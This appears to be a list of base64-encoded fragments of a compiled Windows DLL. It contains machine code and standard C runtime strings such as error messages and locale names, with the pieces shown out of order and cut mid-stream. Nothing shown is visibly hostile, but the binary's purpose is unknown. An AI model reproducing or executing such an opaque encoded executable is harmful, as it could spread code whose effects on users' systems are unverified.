OghPwAAWcNqHGjIXQEQ6DMCAABqCOiiPQAAWYNl/ACDPcCGARABD4TJAAAAxwXohgEQAQAAAIpFEKLkhgEQg30MAA+FnAAAAP81MKIBEIs1SAABEP/Wi9iJXdSF23R0/zUsogEQ/9aL+Ild5Il94Il93IPvBIl93Dv7cldqAP8VRAABEDkHdOo7+3JH/zf/1ovwagD/FUQAARCJB//W/zUwogEQizVIAAEQ/9aJRdj/NSyiARD/1otN2DlN5HUFOUXgdK6JTeSL2Yld1IlF4Iv465xoZAEBEGhUAQEQ6Lv+//9ZWWhsAQEQaGgBARDoqv7//1lZx0X8/v///+ggAAAAg30QAHUpxwXAhgEQAQAAAGoI6A4+AABZ/3UI6F78//+DfRAAdAhqCOj4PQAAWcPoVgEAAMNVi+yDfQgAdRXoNhIAAMcAFgAAAOimDgAAg8j/XcP/dQhqAP81DIcBEP8VeAABEF3DVYvsVlcz9moA/3UM/3UI6OJKAACL+IPEDIX/dSU5BfSGARB2HVbowCEAAIHG6AMAAFk7NfSGARB2A4PO/4P+/3XFi8dfXl3DVYvsU1ZXiz30hgEQM/b/dQjoDgwAAIvYWYXbdSOF/3QfVuh8IQAAiz30hgEQgcboAwAAWTv3dgODzv+D/v91zl9ei8NbXcNVi+xWVzP2/3UM/3UI6KpJAACL+FlZhf91KjlFDHQlOQX0hgEQdh1W6C8hAACBxugDAABZOzX0hgEQdgODzv+D/v91w4vHX15dw8zMzMzMzGjwQwAQZP81AAAAAItEJBCJbCQQjWwkECvgU1ZXoQhwARAxRfwzxVCJZej/dfiLRfzHRfz+////iUX4jUXwZKMAAAAAw4tN8GSJDQAAAABZX19eW4vlXVHDzMzMzMzMzFWL7IPsGFOLXQxWV8ZF/wCLewiNcxAzPQhwARDHRfQBAAAAiweD+P50DYtPBAPOMwww6Hnf//+LRwiL','gACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAIEAgQCBAIEAgQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAEAAQABAAEAAQABAAggCCAIIAggCCAIIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACABAAEAAQABAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQA','UAQQAAAGIAZQAtAEIAWQAAAHMAbAAtAFMASQAAAGUAdAAtAEUARQAAAGwAdgAtAEwAVgAAAGwAdAAtAEwAVA','vc3RfdW5yZWFjaGFibGUAAAAAb3BlcmF0aW9uX2luX3Byb2dyZXNzAAAAaW50ZXJydXB0ZWQAaW52YWxpZF9hcmd1bWVudAAAAABhbHJlYWR5X2Nvbm5lY3RlZAAAAHRvb19tYW55X2ZpbGVzX29wZW4AbWVzc2FnZV9zaXplAAAAAGZpbGVuYW1lX3Rvb19sb25nAAAAbmV0d29ya19kb3duAAAAAG5ldHdvcmtfcmVzZXQAAABuZXR3b3JrX3VucmVhY2hhYmxlAG5vX2J1ZmZlcl9zcGFjZQBub19wcm90b2NvbF9vcHRpb24AAG5vdF9jb25uZWN0ZWQAAABub3RfYV9zb2NrZXQAAAAAb3BlcmF0aW9uX25vdF9zdXBwb3J0ZWQAcHJvdG9jb2xfbm90X3N1cHBvcnRlZAAAd3JvbmdfcHJvdG9jb2xfdHlwZQB0aW1lZF9vdXQAAABvcGVyYXRpb25fd291bGRfYmxvY2sAAABhZGRyZXNzIGZhbWlseSBub3Qgc3VwcG9ydGVkAAAAAGFkZHJlc3MgaW4gdXNlAAAYWwEQMBAAEDQrABA0KwAQYBAAEMAQABCAEAAQzFoBEDAQABDgEAAQ8BAAEGAQABDAEAAQgBAAECxbARAwEAAQYBEAEHARABBgEAAQwBAAEIAQABB0WwEQMBAAEMARABDQEQAQQBIAEMAQABCAEAAQoFgBEMYiABDXOwAQYmFkIGFsbG9jYXRpb24AAOxYARDrIgAQ1zsAEDhZARDrIgAQ1zsAEIhZARDrIgAQ1zsAENhZARCHKwAQAAAAAGNzbeABAAAAAAAAAAAAAAADAAAAIAWTGQAAAAAAAAAAQDoAECBaARBYOwAQ1zsAEFVua25vd24gZXhjZXB0aW9uAAAAmIMBEOiDARBtAHMAYwBvAHIAZQBlAC4AZABsAGwAAABDb3JFeGl0UHJvY2VzcwAAdGFuaAAAAABhc2luAAAAAGFjb3MAAAAAYXRhbgAAAABhdGFuMgAAAHNxcnQAAAAAc2luAGNvcwB0YW4AY2VpbAAAAABmbG9vcgAAAGZhYnMAAAAAbW9kZgAAAABsZGV4cAAAAF9jYWJzAAAAX2h5cG90AABmbW9kAAAAAGZyZXhwAAAAX3kwAF95MQBfeW4AX2xvZ2IAAABfbmV4dGFmdGVyAABleHAAcG93AGx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RldmljZSBvciByZXNvdXJjZSBidXN5AGlvIGVycm9yAAAAAGRpcmVjdG9yeSBub3QgZW1wdHkAaW52YWxpZCBhcmd1bWVudAAAAABubyBzcGFjZSBvbiBkZXZpY2UAAG5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkAAABmdW5jdGlvbiBub3Qgc3VwcG9ydGVkAABubyBsb2NrIGF2YWlsYWJsZQAAAG5vdCBlbm91Z2ggbWVtb3J5AAAAcmVzb3VyY2UgdW5hdmFpbGFibGUgdHJ5IGFnYWluAABjcm9zcyBkZXZpY2UgbGluawAAAG9wZXJhdGlvbiBjYW5jZWxlZAAAdG9vIG1hbnkgZmlsZXMgb3BlbgBwZXJtaXNzaW9uX2RlbmllZAAAAGFkZHJlc3NfaW5fdXNlAABhZGRyZXNzX25vdF9hdmFpbGFibGUAAABhZGRyZXNzX2ZhbWlseV9ub3Rfc3VwcG9ydGVkAAAAAGNvbm5lY3Rpb25fYWxyZWFkeV9pbl9wcm9ncmVzcwAAYmFkX2ZpbGVfZGVzY3JpcHRvcgBjb25uZWN0aW9uX2Fib3J0ZWQAAGNvbm5lY3Rpb25fcmVmdXNlZAAAY29ubmVjdGlvbl9yZXNldAAAAABkZXN0aW5hdGlvbl9hZGRyZXNzX3JlcXVpcmVkAAAAAGJhZF9hZGRyZXNzAGh','HHRfz+////i03wZIkNAAAAAFlfXluL5V3Di0XsiwAzyYE4BQAAwA+UwYvBw4tl6MdF/P7///8zwItN8GSJDQAAAABZX15bi+Vdw8zMzMzMzFWL7ItFCLlNWgAAZjkIdAQzwF3Di0g8A8gzwIE5UEUAAHUMugsBAABmOVEYD5TAXcP/NaiQARD/FUgAARDDVYvsi0UIo6CQARCjpJABEKOokAEQo6yQARBdw2okaFhgARDoer///4Nl1ACDZdAAM9uJXeAz/4l92It1CIP+C39QdBWLxmoCWSvBdCIrwXQIK8F0XivBdUjoyNP//4v4iX3Yhf91FoPI/+liAQAAx0XkoJABEKGgkAEQ617/d1xW6FEBAABZWYPACIlF5IsA61aLxoPoD3Q2g+gGdCNIdBLoMND//8cAFgAAAOigzP//67THReSokAEQoaiQARDrGsdF5KSQARChpJABEOsMx0XkrJABEKGskAEQM9tDiV3gUP8VSAABEIlF3IP4AQ+E2wAAAIXAdQdqA+iuu///hdt0CGoA6A76//9Zg2X8AIP+CHQKg/4LdAWD/gR1HItHYIlF1INnYACD/gh1P4tHZIlF0MdHZIwAAACD/gh1LYsNEBIBEIvRiVXMoRQSARADwTvQfSRrygyLR1yDZAgIAEKJVcyLDRASARDr3moA/xVEAAEQi03kiQHHRfz+////6BgAAACD/gh1IP93ZFb/VdxZ6xqLdQiLXeCLfdiF23QIagDo2vr//1nDVv9V3FmD/gh0CoP+C3QFg/4EdRGLRdSJR2CD/gh1BotF0IlHZDPA6BG+///DVYvsi1UMiw0IEgEQVot1CDlyBHQNa8EMg8IMA0UMO9By7mvJDANNDDvRcwk5cgR1BIvC6wIzwF5dw1WL7ItFCKO0kAEQXcODPTSiARAAdRJq/ehNAwAAWccFNKIBEAEAAAAzwMNVi+yLRQgtpAMAAHQmg+gEdBqD6A10Dkh0BDPAXcOhkB8BEF3DoYwfARBdw6GIHwEQXcOhhB8BEF3DVYvsg+wQjU3wagDolM3//4Ml0JABEACLRQiD+P51EscF0JABEAEAAAD/FfAAARDrLIP4/XUSxwXQkAEQAQAAAP8V7AABEOsVg/j8dRCLRfDHBdCQARABAAAAi0AEgH38AHQHi034g2Fw/YvlXcNVi+xTi10IVldoAQEAADP/jX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